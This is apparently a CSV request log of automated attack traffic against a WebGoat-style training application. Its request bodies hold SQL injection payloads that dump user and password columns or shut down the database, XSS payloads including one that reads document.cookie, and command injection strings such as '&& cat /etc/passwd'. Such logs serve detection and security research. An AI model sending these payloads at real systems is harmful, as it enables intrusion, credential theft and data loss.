_id,signature,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
076638b2-1c35-401c-8826-66e251b6a3a8,67cb904361b08ee28bde21e67df1f255,14753,155.166.185.207,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'Phk1NcZK'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:46.227899
cedd12bb-1b71-4d14-bd2a-65448008511a,cce90e6c144c444a770b4357ccf15803,14745,41.56.185.239,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:46.231906
cf1fa7f2-33b7-4816-9618-9a491eecc296,28bbc67abd892a709fd104ecfd952d2b,273,21.89.245.10,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9128'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:12:46.277393
0ab327d2-ac1e-4465-ac9f-42dcbfd5b72c,45debb1fe07cb0f5feea015581e132ba,14753,220.18.15.37,POST,cia/command-injection,HTTP/1.1,"[('_uid', '18tznvLn'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:46.334121
c11cdfa8-2f9a-4a2b-b95c-d269cabd608e,376b229ee64de9ba42d8c9f9a08690bb,279,37.148.211.199,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=3ZWlnJjY,200,2025-10-12T01:12:46.337712
b750051b-7ff7-4900-b939-65ac8d0b459f,f5f5599cbc41182409c142846983e3c9,273,177.156.220.7,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5789'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:12:46.385030
669f6b3c-9f7a-4427-af4e-dfb9280d7ccb,6256282086ef51c556739350f69aeab4,279,212.103.236.47,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=NXKQ8ozn,200,2025-10-12T01:12:46.438838
6d230bc1-3790-43ea-8378-e84d391369ff,d85b9262bf798dd8067f37310cb72edb,367,221.183.203.95,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8618'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:46.489060
63faf15f-b194-4441-862f-bd3f62ff8e78,f77f63a4f6af6c9e5ccc0f2d07685307,14745,158.51.121.120,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:46.542882
66a8060c-3bd0-411d-941f-6aa515c6be3e,abcddebd1cdfa7ad33aeec783d10c7f8,273,164.214.249.139,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7421'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:12:46.588795
11d539ea-16ea-4436-96ca-ac94496b8c97,38e1d3062cbd94512944da57b980bd7d,279,193.122.200.103,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=mETgDjCH,200,2025-10-12T01:12:46.643793
74b9bfbe-745e-475a-9a3e-9623b3c0956a,aa2a85a15e79f5c978402b9cbf976f99,14745,128.151.65.212,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:46.692979
495c72f0-ca05-4e29-808c-db7ff16848b3,de7cedd92aa6f5237424c98bf214daa7,279,23.211.227.29,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=18RWMSa3,200,2025-10-12T01:12:46.744175
4bd8b5ad-493a-4f0c-8779-c37bcc6651f8,f5e29a08610f342b48a5f0759252b712,279,56.233.209.178,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=ZmDJk335,200,2025-10-12T01:12:46.793311
b2af975e-e938-4350-9f01-b2ff6a3054d8,2afd6c96bac16d20811eecdd38d4a3a0,14753,113.153.210.65,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'JrqNvWfc'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:46.845594
f2a19454-061f-4fe1-a45f-dbcee9d95e8d,f2b254dcc546aeb02921465aaa12b7d2,14753,63.200.149.248,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'TbQLapR4'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:12:46.852187
6c4cbe0c-713f-4edc-8d84-86c6754154bd,ddba39f934f83e3e4a6dc39996ea5ee8,14753,91.1.184.153,POST,cia/command-injection,HTTP/1.1,"[('_uid', '12KV5po4'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:46.856697
634dbfe6-9080-40e4-8228-d6adeef9e498,a0a2da98bde3604305c9528d6f56290e,367,47.32.158.12,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3415'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:46.900291
b9887c05-223a-474d-96f1-04f73b7b7ddb,ff3a8b3bf55c38cf5ef43cd346e70185,279,202.205.126.110,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=NFRMAJp0,200,2025-10-12T01:12:46.955224
59e8ed5f-779d-477c-817c-dadd4ffe17d8,f5a1fc5cb05c5ea299b4e245049d8c73,367,172.8.179.250,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8983'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:12:47.007027
cf49b3a5-b681-4cb4-a266-68a1b81c8927,3939106e47d5df05a42402866ad257de,14745,20.225.197.250,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:47.059351
20ecd9da-9177-4b31-80d5-5d8514b1b09a,63840ccf62fff927b5b86c5827c49b12,279,42.167.147.230,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=NqXyP035,200,2025-10-12T01:12:47.105639
b73e1a1e-593d-48b0-8d65-61bc1011b342,873038d14c0edf81fb037831524e3721,367,95.249.195.163,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7549'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:47.156535
5d7736a8-f0bf-4f31-9bfc-10e5cda37f6e,12eb81bd6232123cb60eecf55e64d3b9,307,115.31.186.158,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6733'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:12:47.212594
1f6d9113-b110-44ed-bb79-cdbc22e1fcc0,c8901fbfa459904fb7af1e3b142e705f,279,183.92.124.107,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=lfSdcPdI,200,2025-10-12T01:12:47.404390
0386d8c6-1b54-4b5e-88c9-efe65fc85cf8,bacf4ada78f7acb418bb1706c6b3e640,279,71.249.203.199,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=0Or3Zrkq,200,2025-10-12T01:12:47.412319
5275c853-6efc-4784-a086-06e50bbaaac8,7c300b7b3e974d61ad169317c7135e9c,14745,130.90.77.211,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:47.464716
7acb80ca-50d2-4492-b059-221d92ef7e4c,176f092a8a26b652b4bd31782db8cf5f,367,180.214.34.27,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4982'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:12:47.512728
94eb9fdb-0301-4802-912b-afa352783da6,59ba7f61d4284f68f78e94cfb96d44d6,14753,80.112.135.120,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'QlprEqD3'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:47.567425
a062eb22-5f71-4821-a9cb-31531cdd8796,77077d07aa5adb91d1d0f5a933d40d39,14745,61.89.182.206,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:47.570933
5009071c-1b71-448d-9080-3c1032116b7b,a7cbb811e7cdb2668e9a0ccee305b15c,307,203.236.103.191,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6878'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:12:47.616795
13540fb9-7c9d-4ba6-8e18-7029b22a0315,e35cdb569b1774f6cbb0498203153f07,14745,89.99.33.234,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:47.813611
0014c7e0-e828-4855-ba6b-151f0d90a77d,2fb02d140ee9b7561c9710113cc2fb90,14753,124.230.119.52,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'yyU4DRWg'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:47.820670
9b70e9f5-8205-4fc5-a229-106d661ea34b,01d0efb9c6f7ae6380db06b9f8def01c,273,178.155.119.60,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3609'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:47.823688
cbeaef6f-0eae-400b-8f48-4609830baf08,81ba201ac8b32fea096bdabec4e519b9,14745,153.164.66.204,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:47.874196
ff490ce2-bc53-45a3-9481-61afee719fa1,2fbfdb3ea5ca0acf192037f3599689e9,279,55.225.182.127,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=qutMv5eJ,200,2025-10-12T01:12:47.920895
8e67cfdb-6bd8-40de-8988-77f21d53d39c,262d1ee9e2aeec7a0302e506b7b89e7c,279,13.238.218.79,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=eTf3JAbF,200,2025-10-12T01:12:47.972936
052f6c4a-e278-476a-8079-7f8474ab53e3,822e078096a3e5ec88382233af948261,14745,50.158.174.99,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:48.026274
59db6916-15cd-4c54-9c5f-10a2d5726765,206336aafe0b7159c8a685ab4a7834e0,279,89.72.114.252,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=vEi81OZt,200,2025-10-12T01:12:48.072825
420b2234-2f89-492a-9ff4-38a9adca9ed6,ecab6f76f61137ce4844c6801a827a65,273,204.67.244.239,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5375'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:12:48.125516
43309983-e9cd-486a-abe6-bd758337cfeb,18e0df97371a78d977e621f764e1e07a,367,40.214.237.143,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7304'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:48.180001
a228d199-c48c-4672-9785-b4a0d9fb31cb,c50014d218d59f32569698a203616368,14753,79.237.93.188,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'p97JJVcg'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:48.231588
d3cf00ed-2de0-4b63-a6d3-82f2221b780c,122a7307dd03c83443e601c3fe0a2793,273,148.78.7.150,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3083'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:12:48.238102
93b9c92a-1ddd-40c6-8ef3-ce8f4ad50954,a75416407c61bda50f7d8bc33e29362e,14745,28.82.12.24,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:48.291934
388d44d2-6710-4138-b281-162a6e2ec0a9,814c13eeea82be9c6b98088e731ebbc4,279,192.87.196.37,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=FvqIvOEJ,200,2025-10-12T01:12:48.340889
6c0390c0-1a05-498d-be8b-6b8cc24f0af2,0f95e7162fa7795c0be4749186d75d07,14745,214.43.77.203,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:48.393147
13e45575-52e1-4bed-ae89-3142a95f874b,42cddc33e9c154820938eedbc63d6069,367,45.254.34.82,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3609'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:12:48.440298
0836fdd1-5688-45cd-adc7-4d750fcda8ba,cc342897b555e748c08b6d36286039b3,279,171.21.107.156,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=KfV3JpDd,200,2025-10-12T01:12:48.494996
66a62ae1-47de-4402-b2a0-c86c519455f3,d925203824bc3bf05d8cef575361f340,273,157.182.164.146,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1697'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:48.544350
d08c6d8f-f244-489a-9f80-a9b7f550ab58,cfacffcb11368eebdd8fe63276d17d49,273,172.40.164.23,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7835'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:48.597828
101f56d8-b126-4af5-a832-0c73b47a442f,474ca741e8d0f7f9a5c9270e163ddf5d,273,149.162.168.19,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1184'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:48.651122
e86cb3ed-ad4b-44b5-9dfc-8e058e6e2ca5,187123a919a02b3c2a71e4013f97d4be,14753,55.75.102.234,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'JkwFr6hB'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:48.702123
f6ad5606-0609-4ec7-81ce-58341797cd08,ea6eda2358cf8b6377a0a446b7f65d84,14753,22.220.83.50,POST,cia/command-injection,HTTP/1.1,"[('_uid', '9E4iZ9Iu'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:48.706630
d62f87c0-8350-485e-930a-71790241fa0b,6b81a792805e0477fb628e38555a7b33,279,174.179.120.10,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=cVoJFsGv,200,2025-10-12T01:12:48.752499
de8816d9-5550-4a36-86b0-6199eeb3ea8a,79fd7eeeac8218e58fc5ce422d93dcda,14745,108.69.137.121,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:48.808042
05cdaeb3-df87-476d-9efb-277505df6eb3,3a8c48027ad6777a6833b659c404ed5c,273,16.34.168.192,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2015'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:48.859164
c7692af9-2f12-4d23-9bb5-5e8832869c6a,1da6d94081f15792c15a7732ac805c71,279,135.35.27.79,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=JDHJOb0o,200,2025-10-12T01:12:48.910005
238575bd-d8fc-4786-8e42-f4b1a878cbe0,9f1948d455aed013da36055664bfd283,14745,140.7.35.123,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:48.960727
484b2e58-e27a-42b3-bbb3-9d736511b59c,c5d800da8218935db4ac8f6a0ee49c60,273,220.200.153.211,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3363'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:12:49.010185
1e1fd2af-3271-4dcc-a2cb-be148dd2e818,cc27083e9b2653bcc41238d05bec5884,14745,217.125.93.14,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:49.064050
3aef7a21-cbf8-412c-9351-dcfc717cb5c5,969074a01ea1dcf0c619ef95afd820dc,367,37.4.32.18,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4334'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:12:49.114270
540cfcd2-041b-434e-8e52-b5b01007973e,91285b6de4927922f297b55fa7f22df2,273,4.237.44.108,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3754'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:49.167537
84271c8d-033f-4083-8ac5-f4bac76da544,e07d90d40b3ae90d8e96aa08f3b2199a,279,119.136.168.103,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=caewxzY3,200,2025-10-12T01:12:49.218795
b3180d03-0909-4136-acb3-71badb5a0a6f,e0c6057d5faf424500f4c614d62e511e,279,171.225.250.61,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=vgnLK3Am,200,2025-10-12T01:12:49.270056
012ecf07-1336-454c-ac97-8ed66bfbfa35,9b10fa6f625a46391200032671d46165,14745,120.203.147.109,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:49.322733
8bbe70a1-a4f7-4fd2-8de7-cadc8fc58a7b,e62c54977008a38bc1fcc8e86dbdf01f,14745,167.115.169.200,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:49.369135
d8fae9c7-060e-4b54-848a-6015773d01cd,c217e26a99a260ab643a62f8ce85b3cd,279,79.126.123.109,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=84LTHTUf,200,2025-10-12T01:12:49.417369
69aa6dac-43e4-466c-9562-642118109f5a,efe951cf3bfbc624a7d4f0996e562ab5,14745,122.251.174.146,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:49.468944
3344bc21-f003-490b-b015-de4369287147,306a84a45eb66547b52e8e3b27ac9f4c,273,109.244.59.127,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5544'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:12:49.518111
4a3448e1-7b9f-4fe9-b3fd-1137d670b96f,d383db6432cbdbc70f8d1aa7863f5d49,14745,213.211.185.79,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:49.530297
bb848ce6-f21d-4501-9f29-4e1508c89381,45a5e7204200bc2a06709456e401f0cb,14753,3.127.66.176,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'D2ubVP9I'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:49.578810
500b0fc2-6fb0-467b-a192-b6287b63d564,f3a1046911b33fc0a0c71265c3d41a34,367,61.101.19.65,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2778'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:12:49.583321
f4f433ac-86b1-4b63-969b-a5af0edaa386,dcd80caa6d2a7e2d402c28ceae436fc4,367,12.19.187.62,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5986'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:49.637494
7930ec77-455c-4417-a28f-05c595f6c782,fadd94579e247203e10173578f45f82a,279,118.200.255.213,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=R1TnHxXb,200,2025-10-12T01:12:49.690535
f0294792-5cdd-4a4d-a6ef-7a1907e0540b,4b360bcfba01eeed209e3b852c67206e,14753,151.156.118.5,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'LlxaFbC0'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:49.740217
a459e17e-8093-4662-b5cb-5618d1dc3e6b,960578617957443db02e5ecfdf4da4d8,279,118.200.19.27,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=L5UGXSmv,200,2025-10-12T01:12:49.744610
ea836adc-41b9-45ba-a722-80ffb6f6e876,2a174c10f288e4b3bbbb2f6272c1e759,279,54.52.51.194,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=RUUuWWtj,200,2025-10-12T01:12:49.791895
93d56db6-a5b7-40bc-8bc4-c49677503671,6fe722f89a7d5c7ef6d3ffed6146b0bd,14745,145.182.1.191,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:49.846153
346f7589-4e0e-4322-a71c-9453dab701c0,e07f93adc126af2e27d15e2e15da0eb6,14753,107.21.24.157,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'LQV3HxLz'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:49.893562
f9109b81-82f2-4b54-992b-fbd3c9a74748,991ed50e196901f58f896b880f3bb790,14745,61.131.184.166,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:49.897716
de1a97f2-4360-4c0d-8c4b-0fca187bc8bd,a172534244071660aa13307fb8e8db0c,14753,60.195.155.77,POST,cia/command-injection,HTTP/1.1,"[('_uid', '30Nc9L7r'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:49.944619
d6cfa5fd-203c-4b5a-956b-d8b0c4c6e8b5,ba9af2ba6d59d244d5315290fbbdcbcf,279,132.255.181.151,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=Y1qAwLYw,200,2025-10-12T01:12:49.948861
c017dc25-fc17-46f2-b834-367b236e4ab8,274db46b7ed1e96835a616179547a296,14745,170.115.104.7,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.000865
eee7e28c-2861-46ff-bde3-31d7282e5e87,79ec73b00cebec2e705950f892be353b,14745,94.107.234.12,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.049331
27e8574c-fffe-4557-92c4-f75fcb24ced4,e7c87b4df970f31f1868fc5b9f2391c3,279,76.22.202.160,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=hONq7n9A,200,2025-10-12T01:12:50.096496
895d4e04-6ebd-4ec3-a613-e8e1140e2997,2f4a776912c6dba73e62d6cb0e1f6328,14745,188.79.172.47,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.148652
75a658fc-73ee-4755-9bce-7e0f57e51b3d,3d74908bc2c216c032e37a559a4e5129,14745,65.115.237.9,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.198113
b1153d78-ec84-428d-9c61-7c00d74eaa4a,4337ccb17ef60019ea0b29ffbab784fe,14745,67.39.242.133,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.245030
4efb6e7f-9a5c-4015-8e59-29f8ed03c679,6c6e863645f5517af2467bd84c7d4210,273,188.42.79.182,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9147'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:12:50.293272
7833f6b7-09a8-47de-8d1e-a071fce150d2,8853ac8e6b4d3feefeed98b867073eb4,279,80.188.222.63,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=1EKfg3c6,200,2025-10-12T01:12:50.348492
ea6f061b-5d38-4a73-bb20-5a3c1d45a075,0ff4c8bd7b97944d68062aa6059a0019,14745,94.41.137.179,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.400220
9658021a-47c2-49e8-893b-2c54061b3db1,caa6c1473ef84cb3d75c7691352b0151,14753,220.179.128.221,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'KHCc0PD8'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:50.448835
a574563a-5dfd-4457-a417-b30d11c24ec2,4cc747a5b9c45115ab8a197614f9f66b,14745,162.42.158.81,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.452573
b7e12aaa-7fc3-4e88-8f68-e00ac57f2996,92a3031e43dfe208c7ebc2a302aae176,14753,212.181.35.105,POST,cia/command-injection,HTTP/1.1,"[('_uid', '8mqmhd0B'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:50.499393
f73c7d41-3c28-4604-9380-9a08cc81a9a1,1cbb12f0e0d1f30a3fbefed5bcacb50e,14745,178.103.63.222,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.503731
1fac2a85-bf08-4b61-a109-637c4a437ccc,6a4677dcc0a71be8ef214733e387cdbf,14745,214.36.241.136,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.548480
17f2bedd-ea47-4ae8-90b7-5b50f35f474b,06b193348d422fe5802e6420c72412f2,14753,13.88.48.167,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'sHmWAIgV'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:12:50.597403
a219e7dc-5c63-4358-92e9-0d7fc19a0c7c,b808ddaa3b195a51d0d31cf525f09baf,14745,140.51.225.157,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.599405
128673f0-fb1d-496e-8b29-4911d8dfee65,7c900dd26031be23c2e51c070acf45cc,14745,102.141.173.47,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.649475
97208912-120a-430a-9174-f11bd217bb89,8feee5945788ebdbda29376339179e08,273,43.75.168.74,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3307'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:50.697240
9d667ed4-7763-4729-92d2-bd282a778d93,914cadc0fb93d58d70341c5e52c97f5c,14745,8.127.33.235,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:50.755002
262cb2cb-dbb4-4b2c-98bd-ead2dab38810,549377e483580bf74bf2f95b668af145,279,213.76.42.213,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=vfiFyL0t,200,2025-10-12T01:12:50.800772
ab9dacd1-5fc1-4ad5-b9a3-16a929452317,1a730a0b5ca49ee50806d9f603e84f11,307,48.78.54.213,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5132'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:12:50.854185
ce257eae-74b1-4a35-a427-a22657162d55,f9810de15eab5cf6b2e3e38b9fc9f1dc,279,42.209.18.169,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=8Bn0Oj6H,200,2025-10-12T01:12:51.043514
bf23c570-0ecb-4834-8488-fc5c7c6b7ab1,ae2f8521f2022cdf6d584f10493c0ab0,273,130.177.139.67,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1644'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:51.050090
103784b0-e403-46d0-84f9-5e4060bc2a87,6861b265b1be66b2e17ec9fc31812a00,14745,98.247.38.39,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:51.103463
49a99c23-ebec-483a-a263-d4d8aff87b58,a8523fead8c71f225e8449c71e4a4ee8,14753,92.153.209.164,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'B7wmTiLI'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:51.148430
df5a7ca2-fd4e-4d70-af0d-118b2626256e,72a8ba2c44007e526b60478de9a39a26,14745,52.232.231.242,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:51.151673
